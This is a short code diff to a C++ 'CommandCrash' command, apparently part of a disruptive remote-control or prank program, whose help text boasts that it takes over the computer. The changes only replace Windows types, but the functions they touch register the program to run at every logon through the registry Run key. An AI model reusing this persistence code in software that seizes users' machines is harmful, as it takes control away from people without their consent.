@@ -103,14 +103,14 @@ string* CommandCrash::getHelp()
 	return new string("Takes over your computer. Good luck getting it back without a hard shutdown.");
 }
 
-BOOL CommandCrash::IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
+bool CommandCrash::IsMyProgramRegisteredForStartup(wchar_t* pszAppName)
 {
 	HKEY hKey = NULL;
-	LONG lResult = 0;
-	BOOL fSuccess = TRUE;
-	DWORD dwRegType = REG_SZ;
+	long lResult = 0;
+	bool fSuccess = true;
+	unsigned long dwRegType = REG_SZ;
 	wchar_t szPathToExe[MAX_PATH] = {};
-	DWORD dwSize = sizeof(szPathToExe);
+	unsigned long dwSize = sizeof(szPathToExe);
 
 	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
 
@@ -136,14 +136,14 @@ BOOL CommandCrash::IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
 	return fSuccess;
 }
 
-BOOL CommandCrash::RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
+bool CommandCrash::RegisterMyProgramForStartup(wchar_t* pszAppName, wchar_t* pathToExe, wchar_t* args)
 {
 	HKEY hKey = NULL;
-	LONG lResult = 0;
-	BOOL fSuccess = TRUE;
-	DWORD dwSize;
+	long lResult = 0;
+	bool fSuccess = true;
+	unsigned long dwSize;
 
-	const size_t count = MAX_PATH * 2;
+	const unsigned __int64 count = MAX_PATH * 2;
 	wchar_t szValue[count] = {};
 
 
@@ -165,7 +165,7 @@ BOOL CommandCrash::RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToE
 	if (fSuccess)
 	{
 		dwSize = (wcslen(szValue) + 1) * 2;
-		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (unsigned char*)szValue, dwSize);
 		fSuccess = (lResult == 0);
 	}
 
